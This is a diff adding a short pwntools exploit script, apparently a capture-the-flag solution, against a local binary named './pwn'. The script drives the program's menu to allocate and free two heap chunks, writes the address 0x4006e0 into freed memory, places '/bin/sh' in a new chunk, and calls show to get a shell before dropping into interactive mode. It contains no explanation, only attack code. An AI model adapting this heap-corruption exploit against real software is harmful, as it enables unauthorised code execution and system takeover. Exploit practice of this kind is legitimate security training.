@@ -1,0 +1,35 @@
+from pwn import *
+context.log_level='debug'
+context.arch='amd64'
+p=process("./pwn")
+sla 	= lambda a,b: p.sendlineafter(a,b)
+sa 		= lambda a,b: p.sendafter(a,b)
+ra 		= lambda a,b: p.readuntil(a,b)
+sl      = lambda a: p.sendline(a)
+def cmd(c):
+    sla("> ",str(c))
+    return 
+def add(size,c="A",t=1):
+	cmd(1)
+	sla("?\n",str(t))
+	sla("?\n",str(size))
+	sa("?\n",c)
+def num(n):
+    cmd(1)
+    sla("?\n",str(0))
+    sa("?\n",str(n))
+def show(idx):
+	cmd(3)
+	sla("?\n",str(idx))
+def free(idx):
+	cmd(4)
+	sla("?\n",str(idx))
+add(0x28)#0
+add(0x28)#1
+free(0)
+free(1)
+num(0x4006e0)#1
+add(0x28,'/bin/sh\0')
+show(1)
+#gdb.attach(p,'b free')
+p.interactive()
